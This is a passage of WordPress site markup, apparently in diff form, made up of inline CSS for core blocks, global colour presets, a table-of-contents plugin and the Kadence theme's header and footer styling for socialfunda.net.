.lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:9999999999}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{visibility:visible}@media not (prefers-reduced-motion){.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active) img{animation:turn-off-visibility .25s both}.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active){animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes show-content-image{0%{visibility:hidden}99%{visibility:hidden}to{visibility:visible}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}
+/*# sourceURL=https://socialfunda.net/wp-includes/blocks/image/style.min.css */
+</style>
+<style id='wp-block-list-inline-css'>
+ol,ul{box-sizing:border-box}:root :where(.wp-block-list.has-background){padding:1.25em 2.375em}
+/*# sourceURL=https://socialfunda.net/wp-includes/blocks/list/style.min.css */
+</style>
+<style id='wp-block-search-inline-css'>
+.wp-block-search__button{margin-left:10px;word-break:normal}.wp-block-search__button.has-icon{line-height:0}.wp-block-search__button svg{height:1.25em;min-height:24px;min-width:24px;width:1.25em;fill:currentColor;vertical-align:text-bottom}:where(.wp-block-search__button){border:1px solid #ccc;padding:6px 10px}.wp-block-search__inside-wrapper{display:flex;flex:auto;flex-wrap:nowrap;max-width:100%}.wp-block-search__label{width:100%}.wp-block-search.wp-block-search__button-only .wp-block-search__button{box-sizing:border-box;display:flex;flex-shrink:0;justify-content:center;margin-left:0;max-width:100%}.wp-block-search.wp-block-search__button-only .wp-block-search__inside-wrapper{min-width:0!important;transition-property:width}.wp-block-search.wp-block-search__button-only .wp-block-search__input{flex-basis:100%;transition-duration:.3s}.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden,.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden .wp-block-search__inside-wrapper{overflow:hidden}.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden .wp-block-search__input{border-left-width:0!important;border-right-width:0!important;flex-basis:0;flex-grow:0;margin:0;min-width:0!important;padding-left:0!important;padding-right:0!important;width:0!important}:where(.wp-block-search__input){appearance:none;border:1px solid #949494;flex-grow:1;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;margin-left:0;margin-right:0;min-width:3rem;padding:8px;text-decoration:unset!important;text-transform:inherit}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper){background-color:#fff;border:1px solid #949494;box-sizing:border-box;padding:4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input{border:none;border-radius:0;padding:0 4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input:focus{outline:none}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) :where(.wp-block-search__button){padding:4px 8px}.wp-block-search.aligncenter .wp-block-search__inside-wrapper{margin:auto}.wp-block[data-align=right] .wp-block-search.wp-block-search__button-only .wp-block-search__inside-wrapper{float:right}
+/*# sourceURL=https://socialfunda.net/wp-includes/blocks/search/style.min.css */
+</style>
+<style id='wp-block-group-inline-css'>
+.wp-block-group{box-sizing:border-box}:where(.wp-block-group.wp-block-group-is-layout-constrained){position:relative}
+/*# sourceURL=https://socialfunda.net/wp-includes/blocks/group/style.min.css */
+</style>
+
+<style id='classic-theme-styles-inline-css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+/*# sourceURL=/wp-includes/css/classic-themes.min.css */
+</style>
+<style id='global-styles-inline-css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--theme-palette-1: #2B6CB0;--wp--preset--color--theme-palette-2: #215387;--wp--preset--color--theme-palette-3: #1A202C;--wp--preset--color--theme-palette-4: #2D3748;--wp--preset--color--theme-palette-5: #4A5568;--wp--preset--color--theme-palette-6: #718096;--wp--preset--color--theme-palette-7: #EDF2F7;--wp--preset--color--theme-palette-8: #F7FAFC;--wp--preset--color--theme-palette-9: #ffffff;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 14px;--wp--preset--font-size--medium: 24px;--wp--preset--font-size--large: 32px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--larger: 40px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+<link rel='stylesheet' id='ez-toc-css' href='https://socialfunda.net/wp-content/plugins/easy-table-of-contents/assets/css/screen.min.css?ver=2.0.81' media='all' />
+<style id='ez-toc-inline-css'>
+div#ez-toc-container .ez-toc-title {font-size: 120%;}div#ez-toc-container .ez-toc-title {font-weight: 500;}div#ez-toc-container ul li , div#ez-toc-container ul li a {font-size: 95%;}div#ez-toc-container ul li , div#ez-toc-container ul li a {font-weight: 500;}div#ez-toc-container nav ul ul li {font-size: 90%;}.ez-toc-box-title {font-weight: bold; margin-bottom: 10px; text-align: center; text-transform: uppercase; letter-spacing: 1px; color: #666; padding-bottom: 5px;position:absolute;top:-4%;left:5%;background-color: inherit;transition: top 0.3s ease;}.ez-toc-box-title.toc-closed {top:-25%;}
+/*# sourceURL=ez-toc-inline-css */
+</style>
+<link rel='stylesheet' id='kadence-global-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/global.min.css?ver=9.1.50' media='all' />
+<style id='kadence-global-inline-css'>
+/* Kadence Base CSS */
+:root{--global-palette1:#2B6CB0;--global-palette2:#215387;--global-palette3:#1A202C;--global-palette4:#2D3748;--global-palette5:#4A5568;--global-palette6:#718096;--global-palette7:#EDF2F7;--global-palette8:#F7FAFC;--global-palette9:#ffffff;--global-palette9rgb:255, 255, 255;--global-palette-highlight:var(--global-palette1);--global-palette-highlight-alt:var(--global-palette2);--global-palette-highlight-alt2:var(--global-palette9);--global-palette-btn-bg:var(--global-palette1);--global-palette-btn-bg-hover:var(--global-palette2);--global-palette-btn:var(--global-palette9);--global-palette-btn-hover:var(--global-palette9);--global-body-font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--global-heading-font-family:inherit;--global-primary-nav-font-family:inherit;--global-fallback-font:sans-serif;--global-display-fallback-font:sans-serif;--global-content-width:1290px;--global-content-narrow-width:842px;--global-content-edge-padding:1.5rem;--global-content-boxed-padding:2rem;--global-calc-content-width:calc(1290px - var(--global-content-edge-padding) - var(--global-content-edge-padding) );--wp--style--global--content-size:var(--global-calc-content-width);}.wp-site-blocks{--global-vw:calc( 100vw - ( 0.5 * var(--scrollbar-offset)));}body{background:var(--global-palette8);}body, input, select, optgroup, textarea{font-weight:400;font-size:17px;line-height:1.6;font-family:var(--global-body-font-family);color:var(--global-palette4);}.content-bg, body.content-style-unboxed .site{background:var(--global-palette9);}h1,h2,h3,h4,h5,h6{font-family:var(--global-heading-font-family);}h1{font-weight:700;font-size:32px;line-height:1.5;color:var(--global-palette3);}h2{font-weight:700;font-size:28px;line-height:1.5;color:var(--global-palette3);}h3{font-weight:700;font-size:24px;line-height:1.5;color:var(--global-palette3);}h4{font-weight:700;font-size:22px;line-height:1.5;color:var(--global-palette4);}h5{font-weight:700;font-size:20px;line-height:1.5;color:var(--global-palette4);}h6{font-weight:700;font-size:18px;line-height:1.5;color:var(--global-palette5);}.entry-hero .kadence-breadcrumbs{max-width:1290px;}.site-container, .site-header-row-layout-contained, .site-footer-row-layout-contained, .entry-hero-layout-contained, .comments-area, .alignfull > .wp-block-cover__inner-container, .alignwide > .wp-block-cover__inner-container{max-width:var(--global-content-width);}.content-width-narrow .content-container.site-container, .content-width-narrow .hero-container.site-container{max-width:var(--global-content-narrow-width);}@media all and (min-width: 1520px){.wp-site-blocks .content-container  .alignwide{margin-left:-115px;margin-right:-115px;width:unset;max-width:unset;}}@media all and (min-width: 1102px){.content-width-narrow .wp-site-blocks .content-container .alignwide{margin-left:-130px;margin-right:-130px;width:unset;max-width:unset;}}.content-style-boxed .wp-site-blocks .entry-content .alignwide{margin-left:calc( -1 * var( --global-content-boxed-padding ) );margin-right:calc( -1 * var( --global-content-boxed-padding ) );}.content-area{margin-top:5rem;margin-bottom:5rem;}@media all and (max-width: 1024px){.content-area{margin-top:3rem;margin-bottom:3rem;}}@media all and (max-width: 767px){.content-area{margin-top:2rem;margin-bottom:2rem;}}@media all and (max-width: 1024px){:root{--global-content-boxed-padding:2rem;}}@media all and (max-width: 767px){:root{--global-content-boxed-padding:1.5rem;}}.entry-content-wrap{padding:2rem;}@media all and (max-width: 1024px){.entry-content-wrap{padding:2rem;}}@media all and (max-width: 767px){.entry-content-wrap{padding:1.5rem;}}.entry.single-entry{box-shadow:0px 15px 15px -10px rgba(0,0,0,0.05);}.entry.loop-entry{box-shadow:0px 15px 15px -10px rgba(0,0,0,0.05);}.loop-entry .entry-content-wrap{padding:2rem;}@media all and (max-width: 1024px){.loop-entry .entry-content-wrap{padding:2rem;}}@media all and (max-width: 767px){.loop-entry .entry-content-wrap{padding:1.5rem;}}.primary-sidebar.widget-area .widget{margin-bottom:1.5em;color:var(--global-palette4);}.primary-sidebar.widget-area .widget-title{font-weight:700;font-size:20px;line-height:1.5;color:var(--global-palette3);}button, .button, .wp-block-button__link, input[type="button"], input[type="reset"], input[type="submit"], .fl-button, .elementor-button-wrapper .elementor-button{box-shadow:0px 0px 0px -7px rgba(0,0,0,0);}button:hover, button:focus, button:active, .button:hover, .button:focus, .button:active, .wp-block-button__link:hover, .wp-block-button__link:focus, .wp-block-button__link:active, input[type="button"]:hover, input[type="button"]:focus, input[type="button"]:active, input[type="reset"]:hover, input[type="reset"]:focus, input[type="reset"]:active, input[type="submit"]:hover, input[type="submit"]:focus, input[type="submit"]:active, .elementor-button-wrapper .elementor-button:hover, .elementor-button-wrapper .elementor-button:focus, .elementor-button-wrapper .elementor-button:active{box-shadow:0px 15px 25px -7px rgba(0,0,0,0.1);}.kb-button.kb-btn-global-outline.kb-btn-global-inherit{padding-top:calc(px - 2px);padding-right:calc(px - 2px);padding-bottom:calc(px - 2px);padding-left:calc(px - 2px);}@media all and (min-width: 1025px){.transparent-header .entry-hero .entry-hero-container-inner{padding-top:74px;}}@media all and (max-width: 1024px){.mobile-transparent-header .entry-hero .entry-hero-container-inner{padding-top:74px;}}@media all and (max-width: 767px){.mobile-transparent-header .entry-hero .entry-hero-container-inner{padding-top:74px;}}#kt-scroll-up-reader, #kt-scroll-up{border-radius:0px 0px 0px 0px;bottom:30px;font-size:1.2em;padding:0.4em 0.4em 0.4em 0.4em;}#kt-scroll-up-reader.scroll-up-side-right, #kt-scroll-up.scroll-up-side-right{right:30px;}#kt-scroll-up-reader.scroll-up-side-left, #kt-scroll-up.scroll-up-side-left{left:30px;}.entry-hero.post-hero-section .entry-header{min-height:200px;}.loop-entry.type-post h2.entry-title{font-style:normal;color:#c81700;}
+/* Kadence Header CSS */
+@media all and (max-width: 1024px){.mobile-transparent-header #masthead{position:absolute;left:0px;right:0px;z-index:100;}.kadence-scrollbar-fixer.mobile-transparent-header #masthead{right:var(--scrollbar-offset,0);}.mobile-transparent-header #masthead, .mobile-transparent-header .site-top-header-wrap .site-header-row-container-inner, .mobile-transparent-header .site-main-header-wrap .site-header-row-container-inner, .mobile-transparent-header .site-bottom-header-wrap .site-header-row-container-inner{background:transparent;}.site-header-row-tablet-layout-fullwidth, .site-header-row-tablet-layout-standard{padding:0px;}}@media all and (min-width: 1025px){.transparent-header #masthead{position:absolute;left:0px;right:0px;z-index:100;}.transparent-header.kadence-scrollbar-fixer #masthead{right:var(--scrollbar-offset,0);}.transparent-header #masthead, .transparent-header .site-top-header-wrap .site-header-row-container-inner, .transparent-header .site-main-header-wrap .site-header-row-container-inner, .transparent-header .site-bottom-header-wrap .site-header-row-container-inner{background:transparent;}}.site-branding a.brand img{max-width:150px;}.site-branding a.brand img.svg-logo-image{width:150px;}@media all and (max-width: 767px){.site-branding a.brand img{max-width:116px;}.site-branding a.brand img.svg-logo-image{width:116px;}}.site-branding{padding:0px 0px 0px 0px;}#masthead, #masthead .kadence-sticky-header.item-is-fixed:not(.item-at-start):not(.site-header-row-container):not(.site-main-header-wrap), #masthead .kadence-sticky-header.item-is-fixed:not(.item-at-start) > .site-header-row-container-inner{background:#ffffff;}.site-main-header-wrap .site-header-row-container-inner{border-bottom:4px none #1b6bb8;}.site-main-header-inner-wrap{min-height:74px;}.header-navigation[class*="header-navigation-style-underline"] .header-menu-container.primary-menu-container>ul>li>a:after{width:calc( 100% - 1.36em);}.main-navigation .primary-menu-container > ul > li.menu-item > a{padding-left:calc(1.36em / 2);padding-right:calc(1.36em / 2);padding-top:0.6em;padding-bottom:0.6em;color:var(--global-palette5);}.main-navigation .primary-menu-container > ul > li.menu-item .dropdown-nav-special-toggle{right:calc(1.36em / 2);}.main-navigation .primary-menu-container > ul li.menu-item > a{font-style:normal;font-weight:normal;font-size:17px;}.main-navigation .primary-menu-container > ul > li.menu-item > a:hover{color:#1584d4;background:rgba(33,83,135,0);}.main-navigation .primary-menu-container > ul > li.menu-item.current-menu-item > a{color:#ffffff;background:#1584d4;}.header-navigation .header-menu-container ul ul.sub-menu, .header-navigation .header-menu-container ul ul.submenu{background:var(--global-palette3);box-shadow:0px 2px 13px 0px rgba(0,0,0,0.1);}.header-navigation .header-menu-container ul ul li.menu-item, .header-menu-container ul.menu > li.kadence-menu-mega-enabled > ul > li.menu-item > a{border-bottom:1px solid rgba(255,255,255,0.1);}.header-navigation .header-menu-container ul ul li.menu-item > a{width:200px;padding-top:1em;padding-bottom:1em;color:var(--global-palette8);font-size:12px;}.header-navigation .header-menu-container ul ul li.menu-item > a:hover{color:var(--global-palette9);background:var(--global-palette4);}.header-navigation .header-menu-container ul ul li.menu-item.current-menu-item > a{color:var(--global-palette9);background:var(--global-palette4);}.mobile-toggle-open-container .menu-toggle-open, .mobile-toggle-open-container .menu-toggle-open:focus{color:#1584d4;padding:0.4em 0.6em 0.4em 0em;font-size:14px;}.mobile-toggle-open-container .menu-toggle-open.menu-toggle-style-bordered{border:12px solid currentColor;}.mobile-toggle-open-container .menu-toggle-open .menu-toggle-icon{font-size:27px;}.mobile-toggle-open-container .menu-toggle-open:hover, .mobile-toggle-open-container .menu-toggle-open:focus-visible{color:var(--global-palette5);}.mobile-navigation ul li{font-size:14px;}.mobile-navigation ul li a{padding-top:1em;padding-bottom:1em;}.mobile-navigation ul li > a, .mobile-navigation ul li.menu-item-has-children > .drawer-nav-drop-wrap{color:var(--global-palette8);}.mobile-navigation ul li.current-menu-item > a, .mobile-navigation ul li.current-menu-item.menu-item-has-children > .drawer-nav-drop-wrap{color:#ffffff;}.mobile-navigation ul li.menu-item-has-children .drawer-nav-drop-wrap, .mobile-navigation ul li:not(.menu-item-has-children) a{border-bottom:1px solid rgba(255,255,255,0.1);}.mobile-navigation:not(.drawer-navigation-parent-toggle-true) ul li.menu-item-has-children .drawer-nav-drop-wrap button{border-left:1px solid rgba(255,255,255,0.1);}#mobile-drawer .drawer-inner, #mobile-drawer.popup-drawer-layout-fullwidth.popup-drawer-animation-slice .pop-portion-bg, #mobile-drawer.popup-drawer-layout-fullwidth.popup-drawer-animation-slice.pop-animated.show-drawer .drawer-inner{background:#1584d4;}#mobile-drawer .drawer-header .drawer-toggle{padding:0.6em 0.15em 0.6em 0.15em;font-size:24px;}.header-mobile-social-wrap .header-mobile-social-inner-wrap{font-size:1em;gap:0.65em;}.header-mobile-social-wrap .header-mobile-social-inner-wrap .social-button{border:2px none transparent;border-radius:3px;}.search-toggle-open-container .search-toggle-open{color:#1584d4;margin:0px 0px 0px 10px;}.search-toggle-open-container .search-toggle-open.search-toggle-style-bordered{border:2px solid currentColor;}.search-toggle-open-container .search-toggle-open .search-toggle-icon{font-size:0.83em;}@media all and (max-width: 767px){.search-toggle-open-container .search-toggle-open .search-toggle-icon{font-size:0.61em;}}.search-toggle-open-container .search-toggle-open:hover, .search-toggle-open-container .search-toggle-open:focus{color:var(--global-palette5);}#search-drawer .drawer-inner{background:var(--global-palette1);}@media all and (max-width: 767px){#search-drawer .drawer-inner{background:rgba(43,108,176,0);}}
+/* Kadence Footer CSS */
+.site-middle-footer-wrap .site-footer-row-container-inner{background:#1a1515;font-style:normal;font-weight:500;font-size:17px;color:#fcfdfd;border-top:3px solid #ffffff;border-bottom:3px solid #f9f7f7;}.site-footer .site-middle-footer-wrap a:where(:not(.button):not(.wp-block-button__link):not(.wp-element-button)){color:#f3f4f8;}.site-footer .site-middle-footer-wrap a:where(:not(.button):not(.wp-block-button__link):not(.wp-element-button)):hover{color:#c6f800;}.site-middle-footer-inner-wrap{padding-top:37px;padding-bottom:23px;grid-column-gap:30px;grid-row-gap:30px;}.site-middle-footer-inner-wrap .widget{margin-bottom:5px;}.site-middle-footer-inner-wrap .widget-area .widget-title{font-style:italic;font-weight:700;font-size:21px;line-height:1.408;text-transform:capitalize;color:#0070f8;}.site-middle-footer-inner-wrap .site-footer-section:not(:last-child):after{right:calc(-30px / 2);}.site-top-footer-wrap .site-footer-row-container-inner{background:#2877cf;}.site-top-footer-inner-wrap{padding-top:12px;padding-bottom:11px;grid-column-gap:30px;grid-row-gap:30px;}.site-top-footer-inner-wrap .widget{margin-bottom:30px;}.site-top-footer-inner-wrap .site-footer-section:not(:last-child):after{right:calc(-30px / 2);}.site-bottom-footer-wrap .site-footer-row-container-inner{background:#2877cf;font-style:normal;color:rgba(5,126,255,0);border-top:5px none #f9f7f7;}.site-footer .site-bottom-footer-wrap a:where(:not(.button):not(.wp-block-button__link):not(.wp-element-button)){color:#fdfdfd;}.site-footer .site-bottom-footer-wrap a:where(:not(.button):not(.wp-block-button__link):not(.wp-element-button)):hover{color:#ffffff;}.site-bottom-footer-inner-wrap{min-height:10px;padding-top:10px;padding-bottom:13px;grid-column-gap:30px;}.site-bottom-footer-inner-wrap .widget{margin-bottom:30px;}.site-bottom-footer-inner-wrap .widget-area .widget-title{font-style:normal;color:#fdfdfd;}.site-bottom-footer-inner-wrap .site-footer-section:not(:last-child):after{right:calc(-30px / 2);}.footer-social-wrap{margin:0px 0px 0px 0px;}.footer-social-wrap .footer-social-inner-wrap{font-size:1.14em;gap:0.35em;}.site-footer .site-footer-wrap .site-footer-section .footer-social-wrap .footer-social-inner-wrap .social-button{color:#000000;border:2px none transparent;border-radius:3px;}.site-footer .site-footer-wrap .site-footer-section .footer-social-wrap .footer-social-inner-wrap .social-button:hover{color:#f1f1f1;}#colophon .footer-html{font-style:normal;font-weight:700;font-size:24px;color:#ffffff;margin:2px 0px 0px 0px;}#colophon .site-footer-row-container .site-footer-row .footer-html a{color:#ffffff;}#colophon .site-footer-row-container .site-footer-row .footer-html a:hover{color:#ffffff;}
+/* Kadence Pro Header CSS */
